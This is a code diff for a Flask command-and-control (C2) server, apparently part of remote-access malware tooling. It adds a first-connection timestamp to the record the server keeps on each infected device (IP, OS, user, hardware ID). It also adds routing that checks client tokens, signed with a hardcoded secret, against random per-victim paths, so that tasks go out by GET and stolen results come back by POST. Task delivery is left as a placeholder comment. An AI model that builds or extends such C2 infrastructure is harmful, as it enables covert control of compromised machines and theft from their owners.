@@ -65,6 +65,7 @@ class Device(db.Model):
     os = db.Column(db.String)
     hwid = db.Column(db.String)
     notes = db.Column(db.String)
+    initialConnection = db.Column(db.String)
     uniquePath = db.Column(db.String)
     taskPath = db.Column(db.String)
     reponsePath = db.Column(db.String)
@@ -218,7 +219,8 @@ def contactC2Page():
         token = jwt.decode(jwT, "Noire", algorithms="HS256")
         uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
         newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
-                           hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP)
+                           hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP,
+                           initialConnection=token['time'])
         db.session.add(newClient)
         db.session.commit()
     else:
@@ -229,9 +231,19 @@ def contactC2Page():
     return resp
     
 
-@app.route('/c/<c2ID>/<pName>')
+@app.route('/c/<c2ID>/<pName>', methods=["GET", "POST"])
 def instructReponsePages(c2ID:str, pName:str):
     if not validateC2Client(flask.request): return not_found("Invalid")
+    jwT = flask.request.headers['NClient-Token']
+    gjwT = Device.query.get(jwT)
+    if not gjwT: return not_found("Skipped initialisation")#if not in the system, something is fishy
+    if c2ID != gjwT.uniquePath: return not_found("Bad unique path")
+    if pName != gjwT.taskPath and pName != gjwT.responsePath: return not_found("Bad type path")
+    if pName == gjwT.taskPath:
+        if flask.request.method != "GET": return not_found("Bad method on control path")
+        #return enc task content
+    else:
+        if flask.request.method != "POST": return not_found("Bad method on control path")
 
 #Run forever
 def start_server(port:int):
